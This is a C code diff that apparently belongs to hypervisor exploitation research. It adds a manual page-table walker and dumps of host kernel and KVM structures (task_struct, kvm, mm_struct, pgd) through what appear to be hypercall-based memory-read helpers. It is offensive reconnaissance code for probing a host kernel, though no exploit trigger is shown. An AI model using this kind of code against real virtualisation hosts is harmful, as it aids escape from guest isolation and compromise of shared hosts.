@@ -21,6 +21,60 @@
 #define STRSTR(a) #a
 #define dump(x) printf("%20s = %16lx\n", STR(x), x)
 
+#define BITS_MASK(n, m) ( ((1ULL << n) - 1) & (~((1ULL << m) - 1)) )
+#define PFN_MASK BITS_MASK(52, 12)
+#define BITS(x, n, m) ((x & BITS_MASK(n, m)) >> m)
+
+#define IS_HUGE(pte) (pte & (1ULL << 7))
+
+uintptr_t get_feeling_translate_va(uintptr_t l0, uintptr_t va)
+{
+	printf("get_feeling_translate_va(l0 = %lx, va = %lx)\n", l0, va);
+	l0 -= hc_direct_map();
+	dump(l0);
+	uintptr_t pgd_ptr = l0 + 8 * BITS(va, 48, 39);
+	dump(pgd_ptr);
+	uintptr_t pgd = hc_read_pa(pgd_ptr);
+	dump(pgd);
+
+	uintptr_t l1 = pgd & PFN_MASK;
+	dump(l1);
+	uintptr_t pud_ptr = l1 + 8 * BITS(va, 39, 30);
+	dump(pud_ptr);
+	uintptr_t pud = hc_read_pa(pud_ptr);
+	dump(pud);
+	if (IS_HUGE(pud)) {
+		uintptr_t pa = (pud & BITS_MASK(52, 30)) | BITS(va, 30, 0);
+		dump(pa);
+		printf("true pa from hc_translate_va: %lx\n\n", hc_translate_va(va));
+		return pa;
+	}
+
+	uintptr_t l2 = pud & PFN_MASK;
+	dump(l2);
+	uintptr_t pmd_ptr = l2 + 8 * BITS(va, 30, 21);
+	dump(pmd_ptr);
+	uintptr_t pmd = hc_read_pa(pmd_ptr);
+	dump(pmd);
+	if (IS_HUGE(pmd)) {
+		uintptr_t pa = (pmd & BITS_MASK(52, 21)) | BITS(va, 21, 0);
+		dump(pa);
+		printf("true pa from hc_translate_va: %lx\n\n", hc_translate_va(va));
+		return pa;
+	}
+
+	uintptr_t l3 = pmd & PFN_MASK;
+	dump(l3);
+	uintptr_t pte_ptr = l3 + 8 * BITS(va, 21, 12);
+	dump(pte_ptr);
+	uintptr_t pte = hc_read_pa(pte_ptr);
+	dump(pte);
+	uintptr_t pa = (pte & PFN_MASK) | BITS(va, 12, 0);
+	dump(pa);
+	printf("true pa from hc_translate_va: %lx\n\n", hc_translate_va(va));
+	return pa;
+}
+
 void get_feeling_for_kernel_kvm_data_structures(void)
 {
 	uintptr_t direct_map = hc_direct_map();
@@ -72,7 +126,7 @@ void get_feeling_for_kernel_kvm_data_structures(void)
 		printf("task_struct+%3x = %16lx\n", off, hc_read_va(task_struct+off));
 	}
 	printf("...\n");
-	for (int off = 0x900-0x40; off < 0x900+0x40; off += 8) {
+	for (int off = 0x900-0x40; off < 0x900+0xb0; off += 8) {
 		printf("task_struct+%3x = %16lx\n", off, hc_read_va(task_struct+off));
 	}
 	printf("...\n");
@@ -97,12 +151,52 @@ void get_feeling_for_kernel_kvm_data_structures(void)
 		char comm[16];
 		*(uint64_t *)comm = hc_read_va(task_struct + 0xbf0);
 		*(uint64_t *)&comm[8] = hc_read_va(task_struct + 0xbf0 + 8);
-		printf("task_struct: %16lx tgid: %3d, pid: %3d comm: %s\n", task_struct, tgid, pidd, comm);
+		// printf("task_struct: %16lx tgid: %3d, pid: %3d comm: %s\n", task_struct, tgid, pidd, comm);
 
 		nr_processes++;
 		task_struct = hc_read_va(task_struct + 0x900) - 0x900; // task_struct's tasks.next
 	} while (task_struct != start);
-	printf("nr_processes: %d\n", nr_processes);
+	printf("nr_processes: %d\n\n", nr_processes);
+
+	uintptr_t kvm = hc_read_va(kvm_vcpu);
+	dump(kvm);
+	dump(hc_translate_va(kvm));
+	for (int off = 0x1178-0x20; off < 0x1178+0x20; off += 8) {
+		printf("kvm+%3x = %16lx\n", off, hc_read_va(kvm+off));
+	}
+	printf("\n");
+
+	uintptr_t kvm_next = hc_read_va(kvm + 0x1178) - 0x1178;
+	dump(kvm_next);
+	for (int off = 0x1178-0x20; off < 0x1178+0x20; off += 8) {
+		printf("kvm_next+%3x = %16lx\n", off, hc_read_va(kvm_next+off));
+	}
+	printf("\n");
+
+	uintptr_t kvm_prev = hc_read_va(kvm + 0x1178+8) - 0x1178;
+	dump(kvm_prev);
+	for (int off = 0x1178-0x20; off < 0x1178+0x20; off += 8) {
+		printf("kvm_prev+%3x = %16lx\n", off, hc_read_va(kvm_prev+off));
+	}
+	printf("\n");
+
+	uintptr_t mm_struct = hc_read_va(task_struct+0x950);
+	dump(mm_struct);
+	for (int off = 0; off < 0xc0; off += 8) {
+		printf("mm_struct+%3x = %16lx\n", off, hc_read_va(mm_struct+off));
+	}
+	printf("\n");
+
+	uintptr_t pgd = hc_read_va(mm_struct+0x78);
+	dump(pgd);
+	for (int off = 0xfc0; off < 0x1000; off += 8) {
+		printf("pgd+%3x = %16lx\n", off, hc_read_va(pgd+off));
+	}
+	printf("\n");
+
+	get_feeling_translate_va(pgd, 0xffffffffc1119c78);
+	get_feeling_translate_va(pgd, direct_map+0x1234 + (10UL << 30));
+
 }
 
 void reverse_host_kernel_data_structures(void)
